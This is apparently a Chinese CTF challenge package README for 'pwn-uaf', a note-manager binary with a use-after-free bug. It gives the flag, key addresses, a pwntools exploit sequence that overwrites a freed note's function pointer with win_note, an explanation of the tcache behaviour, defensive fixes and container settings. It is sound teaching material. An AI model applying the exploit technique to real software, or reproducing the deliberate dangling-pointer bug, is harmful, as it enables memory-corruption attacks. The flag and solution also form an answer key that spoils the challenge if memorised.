# pwn-uaf

## 一、题目与考点

| 项 | 值 |
|---|---|
| 难度 | 难 |
| 考点 | 堆对象释放后指针未清空（UAF）；通过悬空指针改写结构体内的函数指针 |
| 容器端口 | 宿主机 9110 → 容器 1337 |
| Flag | `flag{uaf_and_tcache_poisoning}` |

## 题面（直接复制到平台「简介」）

一个便签管理器：新建、编辑、释放、执行，菜单里各占一项。用 `nc <地址> 9110` 连上去，会看到一个 `>` 提示符。目标：每条便签带一个执行时调用的函数指针，让某条便签在执行时打印 flag。

**提示**：释放掉一条便签之后，菜单里其它几项还愿意对同一个下标继续干活吗？用一个下标多试几次。

## 二、题目描述

```
1. new  2. edit  3. free  4. run  5. exit
>
```

```c
struct note {
    char data[32];
    void (*func)(char *);     /* func 在偏移 32 */
};
struct note *notes[8];
```

- `new`：`malloc(sizeof(struct note))`（40 字节，落到 0x30 的 tcache bin），`func = show_note`
- `edit`：`read(0, notes[idx], 40)`，直接往槽位指针写 40 字节
- `free`：`free(notes[idx])`，**不清空槽位**
- `run`：`notes[idx]->func(notes[idx]->data)`

程序里存在 `win_note()`（`system("cat /app/flag")`）。

## 三、解题步骤

1. 看结构与保护：

```bash
checksec --file=files/pwn
# Partial RELRO | No canary | NX enabled | No PIE (0x400000)
nm files/pwn | grep -E 'win_note|show_note|notes'
# 0000000000401284 T win_note
# 0000000000401256 t show_note
# 00000000004040a0 B notes
```

2. 确认 `func` 在偏移 32：`sizeof(struct note) = 32 + 8 = 40`，
   `malloc(40)` 实际拿到 0x30 的 chunk（可用 40 字节），`func` 就在 `chunk+32`。

3. 操作序列（全程不重新 `malloc`，只走释放后使用这条路）：

```python
menu(); p.sendline(b'1'); p.recvuntil(b'data: '); p.sendline(b'hello')   # new 0
menu(); p.sendline(b'3'); p.recvuntil(b'idx: '); p.sendline(b'0')         # free 0，槽位保留
menu(); p.sendline(b'2'); p.recvuntil(b'idx: '); p.sendline(b'0')         # edit 0：悬空指针写
p.recvuntil(b'data: ')
p.send(b'A' * 32 + p64(win_note))          # 32 字节 data + 8 字节 func
menu(); p.sendline(b'4'); p.recvuntil(b'idx: '); p.sendline(b'0')         # run 0
```

4. 跑 exp：

```bash
python3 exp/exp.py
```

输出 `flag{...}`。

## 四、原理

`free(notes[0])` 之后 `notes[0]` 仍指向已释放的堆块，指针没有置 NULL。
此时：
- `edit` 用这个悬空指针往"已释放"的内存写数据，不经过任何分配器检查；
- `run` 用这个悬空指针读取 `func` 并调用。

glibc 2.35 的 tcache 会在释放时把 `next` 和 `key` 写到 `chunk+0` 和 `chunk+8`，
这两处落在 `data[0..15]`，不影响偏移 32 的 `func`。
所以只要在 `free` 之后 `edit`，把 `func` 改成 `win_note`，下一次 `run` 就走进了打印 flag 的分支。

**与完整 tcache poisoning 的关系**：本机 libc 2.35 已移除 `__free_hook`/`__malloc_hook`，
要走完整的 tcache poisoning 得改 `_IO_2_1_stdout_` 或 `__exit_funcs`，
还需要额外的 libc / heap 泄露，成本对一个"迎新型"难题过高。
本题保留 UAF 机制本身（释放后使用悬空指针改函数指针），利用路径只有一条：
先 `free`，再 `edit`，再 `run`。不 `free` 直接 `edit` 改不动 `run` 的行为，
因为 `new` 之后槽位被占用、`func` 由程序自己写成 `show_note`。

## 五、防御建议

- `free` 之后立即把指针置 NULL（`notes[i] = NULL`），`edit`/`run` 都先判空。
- 分配时用 `calloc`，或显式 `memset`，避免未初始化数据。
- 在 `free` 前校验结构体里的魔数，发现被改写就拒绝操作。
- 平台上用 `glibc 2.35+`（默认已无 `__free_hook`）会显著抬高堆利用成本。
- 编译期开 PIE + canary，函数指针的落点不再是固定常量。

## 六、附件清单

| 文件 | 说明 |
|---|---|
| `files/pwn` | 与容器内一致的二进制 |
| `src/pwn.c` | 源码 |
| `exp/exp.py` | pwntools 脚本 |
| `Dockerfile` / `entrypoint.sh` / `docker-compose.yml` | 容器 |
| `checker/main.rx` | 判题脚本 |

`checksec`：

```
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
Stripped: No
```

关键地址：`win_note = 0x401284`，`show_note = 0x401256`，`notes = 0x4040a0`，
`struct note` 大小 40（`data[32] + func`），tcache bin 0x30。

---

## 平台镜像配置（添加镜像时照这张表填）

| 字段 | 填什么 | 说明 |
|---|---|---|
| 容器名称 | `pwn-uaf` | 与题目目录名、tar 文件名保持一致 |
| 镜像标签 | `<registry>/<bucket>/pwn-uaf` | 仓库名取自 tar 文件名（去扩展名），上传后 UI 自动带出 |
| 镜像版本 | 上传后生成的 Unix 时间戳 | 下拉选最新那条，不要手填 |
| 镜像拉取策略 | `Always` | 与平台默认一致 |
| 服务描述 | Pwn/交互题（nc 连上去打） | 只是备注，不影响运行 |
| 传输协议 | `tcp` | 全库只有 TCP 服务 |
| 应用协议 | `raw` | 裸 TCP / SSH / socat 选 raw |
| **服务端口** | **`1337`** | 容器内实际监听端口，必须与 Dockerfile 的 `EXPOSE` 一致 |
| CPU 限制 | `0.1, 0.3` | 最小, 最大（核） |
| 内存限制（MB） | `64, 128` | 最小, 最大 |
| 存储限制（MB） | `64, 1024` | 最小, 最大 |
| restricted | **勾选** | 平台会 drop `NET_BIND_SERVICE`，所以容器监听的是 `1337` 而不是 80 |
| 出网 | **关闭** | 本题不需要外网 |

> 端口必须填 **1337**。这是 socat / 裸 TCP 服务的监听端口，选手用 `nc <地址> <映射端口>` 连。
